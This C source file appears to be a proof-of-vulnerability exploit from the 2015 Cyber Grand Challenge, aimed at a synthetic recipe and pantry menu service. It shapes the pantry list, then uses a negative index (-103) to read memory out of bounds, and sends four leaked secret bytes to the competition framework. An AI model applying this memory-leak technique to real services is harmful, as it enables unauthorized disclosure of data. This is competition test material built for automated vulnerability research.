/*

Author: John Berry <hj@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libcgc.h"

unsigned int cgc_ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;

	while (total_bytes < len) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int cgc_ReadUntil(int fd, char delim, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;

	while (total_bytes < maxlen-1) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		if (c == delim) {
			break;
		}
		buf[total_bytes++] = c;
	}
	buf[total_bytes] = '\0';

	return(total_bytes);
}

unsigned int cgc_SendBytes(int fd, char *buf, unsigned int len) {
	cgc_size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (cgc_transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

unsigned int cgc_pov_strlen(char *buf) {
	unsigned int len = 0;
	while (*(buf+len) != '\0') {
		len++;
	}
	return(len);
}

unsigned int cgc_SendString(int fd, char *buf) {
	unsigned int len = 0;

	return(cgc_SendBytes(fd, buf, cgc_pov_strlen(buf)));
}

void cgc_NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) {
	unsigned int PovType = 2;

	// Request Type 2 negotitation
	if (cgc_SendBytes(3, (char *)&PovType, 4) != 4) {
		cgc__terminate(-1);
	}

	// get the 4-byte value for type2_addr
	if (cgc_ReadBytes(3, (char *)type2_addr, 4) != 4) {
		cgc__terminate(-1);
	}
	// get the 4-byte value for type2_size
	if (cgc_ReadBytes(3, (char *)type2_size, 4) != 4) {
		cgc__terminate(-1);
	}
	// get the 4-byte value for type2_length
	if (cgc_ReadBytes(3, (char *)type2_length, 4) != 4) {
		cgc__terminate(-1);
	}

	return;

}

int cgc_strncmp( char *pDest, char *pSrc, cgc_size_t nbytes)
{
        int index = 0;

        while ( pDest[index] && pSrc[index]  && index < nbytes) {
                if ( pDest[index] != pSrc[index] ) {
                        break;
                }

                index++;
        }

        if ( index == nbytes ) {
                index--;
        }

        return (pDest[index] - pSrc[index]);
}

char *cgc_strstr( char *str, char *sub, cgc_size_t maxlen )
{
	cgc_size_t index = 0;
	cgc_size_t stlen = 0;

	if ( str == NULL || sub == NULL || maxlen == 0 ) {
		return NULL;
	}

	stlen = cgc_pov_strlen( sub );

	while ( index < ( maxlen - ( stlen-1)  ) ) {
		if ( str[index] == sub[0] ) {
			if ( cgc_strncmp( str + index, sub, stlen ) == 0 ) {
				return str + index;
			}
		}

		index++;
	}

	return NULL;
}

unsigned int cgc_ReadUntilString(int fd, char *sub, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;
	cgc_size_t stlen = 0;
	cgc_size_t index = 0;

	stlen = cgc_pov_strlen( sub );

	while (total_bytes < maxlen-1) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}

		buf[total_bytes++] = c;

		if ( sub[index] == c ) {
			index++;
		} else if ( sub[0] == c ) {
			index = 1;
		}

		if ( index == stlen ) {
			buf[total_bytes] = '\0';
			return total_bytes;
		}
	}
	buf[total_bytes] = '\0';

	return 0;
}

void cgc_addpantry( char *name )
{
	char buf[500];

	cgc_SendString( 0, "1\n");
	cgc_ReadUntilString(0, ": ", buf, 500);
	cgc_SendString(0, name);
	cgc_ReadUntilString(0, ": ", buf, 500);
	cgc_SendString(0, "\n");

	return;
}

void cgc_redo(void)
{
	char buf[5000];

	// Read the rest of the menu
	cgc_ReadUntilString( 0, "-> ", buf, 500);

	// Leave the menu
	cgc_SendString(0, "7\n");

	// Read the main menu
	cgc_ReadUntilString( 0, "-> ", buf, 500);

	// Enter the pantry menu
	cgc_SendString(0, "2\n");

	// Read the pantry menu
	cgc_ReadUntilString( 0, "-> ", buf, 500);

	// Delete a pantry
	cgc_SendString(0, "2\n");

	// Read all of the pantry list and then the prompt
	cgc_ReadUntilString( 0, "128]: ", buf, 5000);

	// Delete the 8th entry
	cgc_SendString(0, "7\n");

	/// Read the pantry menu again
	cgc_ReadUntilString( 0, "-> ", buf, 500);

	// Create a new pantry
	cgc_SendString(0, "1\n");

	// Read the pantry prompt
	cgc_ReadUntilString( 0, ": ", buf, 500);

	// Send the name
	cgc_SendString(0, "gggg\n");

	// Read the ingredient prompt
	cgc_ReadUntilString( 0, ": ", buf, 500);

	// Send blank
	cgc_SendString(0, "\n");

	// Read the pantry menu
	cgc_ReadUntilString( 0, "-> ", buf, 500);

	// Leave the pantry menu
	cgc_SendString(0, "6\n");

	// Read the main menu
	cgc_ReadUntilString( 0, "-> ", buf, 500);

	// Enter the recipe menu
	cgc_SendString( 0, "1\n");

	// Read the recipe menu
	cgc_ReadUntilString( 0, "-> ", buf, 500);

	return;
}

int main(int cgc_argc, char *cgc_argv[]) {
	unsigned int type2_addr = 0;
	unsigned int type2_size = 0;
	unsigned int type2_length = 0;
	char buf[5000];
	char secret_buf[100];
	unsigned int i;
	unsigned int index = 0;
	unsigned int found = 0;

	char out[21];

	for ( i = 0; i < 100; i++) {
		secret_buf[i] = '\x00';
	}

	// negotiate a Type2 POV with the Competition Framework
	cgc_NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);

	/// Read main menu
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_SendString(0, "2\n");


	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_addpantry( "a\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_addpantry( "b\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_addpantry( "c\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_addpantry( "d\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_addpantry( "e\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_addpantry( "f\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_addpantry( "gggggggggggggg\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_addpantry( "hhhhhhhhhhhhhh\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_SendString(0, "6\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);
	cgc_SendString(0, "1\n");
	cgc_ReadUntilString( 0, "-> ", buf, 500);

	found = 0;

	while ( !found ) {
		// Print single name
		cgc_SendString(0, "5\n");
		cgc_ReadUntilString( 0, ": ", buf, 500);
		cgc_SendString(0, "-103\n");
		cgc_ReadBytes( 0, buf, 13);
		cgc_ReadBytes( 0, buf, 10);

		index = -1;
		// Check that the cgc_read worked and that there wasn't a null
		for ( i = 0; i < 4; i++) {
			/// If the value is "\n1" then assume that the cgc_read failed
			if ( buf[i] == 0x0a && buf[i+1] == '1') {
				index = i;
				break;
			}
		}

		/// Delete the offending pantry and add it back
		if ( index != -1 ) {
			cgc_redo();
		} else {
			// send the bytes to the competition framework
			cgc_SendBytes(3, (char*)(buf), 4);
			found = 1;
		}
	}

	cgc__terminate( 0 );
}
